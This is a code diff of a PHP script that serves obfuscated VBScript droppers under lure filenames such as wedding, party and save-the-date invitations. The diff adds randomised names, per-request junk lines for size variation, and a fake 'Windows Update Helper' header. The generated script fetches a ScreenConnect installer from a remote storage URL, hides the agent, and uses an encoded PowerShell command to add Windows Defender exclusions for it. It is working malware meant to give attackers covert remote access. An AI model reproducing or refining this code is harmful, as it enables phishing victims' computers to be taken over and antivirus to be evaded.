@@ -1,32 +1,53 @@
 <?php
-// invite.php - Random Invitation-Themed Filenames
+// invite.php - Short random 5-digit numbers + your list
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
-// Random invitation-style filenames
-$fakeNames = [
-    "Invitation.vbs",
-    "Wedding_Invitation.vbs",
-    "Party_Invite.vbs",
-    "Letter_from_Friend.vbs",
-    "Birthday_Invitation.vbs",
-    "Important_Mail.vbs",
-    "Meeting_Invite.vbs"
+$baseNames = [
+    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
+    "Event_Invitation", "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
+    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
+    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
 ];
-$randomFilename = $fakeNames[array_rand($fakeNames)];
 
-header('Content-Disposition: attachment; filename="' . $randomFilename . '"');
+$cookieName = "inv_used";
+$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
+if (!is_array($used)) $used = [];
 
+$available = array_diff($baseNames, $used);
+
+if (empty($available)) {
+    $available = $baseNames;
+    $used = [];
+}
+
+$chosenBase = $available[array_rand($available)];
+$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);  // Unique 5 digits
+
+$chosen = $chosenBase . "_" . $random5 . ".vbs";
+
+$used[] = $chosenBase;
+setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");
+
+header('Content-Disposition: attachment; filename="' . $chosen . '"');
+
+// === Rest of the code (obfuscation, elevation, junk for size variation) ===
 $sessionId = bin2hex(random_bytes(24));
 $ts        = time();
 $randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
 $randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
 $xorKey    = rand(100, 255);
 
+$junkLines = rand(12, 45);
+$junk = "";
+for ($i = 0; $i < $junkLines; $i++) {
+    $junk .= "' Junk " . bin2hex(random_bytes(rand(8, 22))) . "\n";
+}
+
 $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";   // CHANGE THIS
 
 echo <<<VBS
-' Windows Update Helper
+' Windows Update Helper - $ts
 
 Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
@@ -47,7 +68,7 @@ Function IsElevated()
     Dim wmi, proc
     Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
     Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
-    IsElevated = False ' Simplified for reliability - adjust if needed
+    IsElevated = False
 End Function
 
 Sub $randFunc
@@ -103,6 +124,7 @@ Sub HideAgent()
     objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
 End Sub
 
+$junk
 Call $randFunc
 WScript.Quit
 VBS;
